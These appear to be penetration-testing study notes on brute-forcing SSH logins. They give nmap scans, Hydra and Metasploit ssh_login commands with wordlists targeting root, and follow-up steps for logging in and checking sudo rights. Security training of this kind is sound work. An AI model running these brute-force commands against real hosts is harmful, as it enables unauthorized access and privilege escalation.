
## 🛡️ SSH Dictionary Attack – Complete Notes

### 🎯 Objective

Attempt brute-force attack on an SSH service to gain access when:

* You **don’t have valid credentials**
* SSH port (22) is **open** on the target

---

### 🔍 Step 1: Enumeration

Before attempting a dictionary attack, **identify** that SSH is open.

```bash
nmap -p22 -sV <target-ip>
```

You may also run:

```bash
nmap -sV -O <target-ip>
```

---

### 💣 Step 2: SSH Brute Force Attack Using Hydra

#### 🔐 Basic Hydra Command

```bash
hydra -l <username> -P /path/to/password-list.txt ssh://<target-ip>
```

#### 🔐 Example:

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10
```

#### 📂 Using Username and Password Lists:

```bash
hydra -L /usr/share/wordlists/usernames.txt -P /usr/share/wordlists/rockyou.txt ssh://<target-ip>
```

✅ **Flags Explained:**

* `-l` → single username
* `-L` → list of usernames
* `-P` → list of passwords
* `ssh://` → target protocol

---

### 🧨 Step 3: SSH Brute Force Using Metasploit

1. Start Metasploit:

```bash
msfconsole
```

2. Use SSH Login Module:

```bash
use auxiliary/scanner/ssh/ssh_login
```

3. Set options:

```bash
set RHOSTS <target-ip>
set USERNAME <username>        # Or use USER_FILE for list
set PASS_FILE /path/to/password-list.txt
```

4. (Optional) Enable verbose to see attempts:

```bash
set VERBOSE true
```

5. Run the module:

```bash
run
```

---

### 🛠️ After Getting Credentials

Once valid SSH credentials are found:

```bash
ssh <user>@<target-ip>
```

Example:

```bash
ssh admin@192.168.1.10
```

🔐 If you get access, **check for sudo permissions**:

```bash
sudo -l
```

🔍 Look for:

* Access to root commands
* Misconfigurations (e.g., NOPASSWD)

---

### 🧠 Additional Notes

* SSH brute-force attacks are **noisy** — easily detected.
* Avoid brute-forcing public IPs without **legal permission**.
* Try **default creds** or **Google known service usernames** if enumeration gives software version.

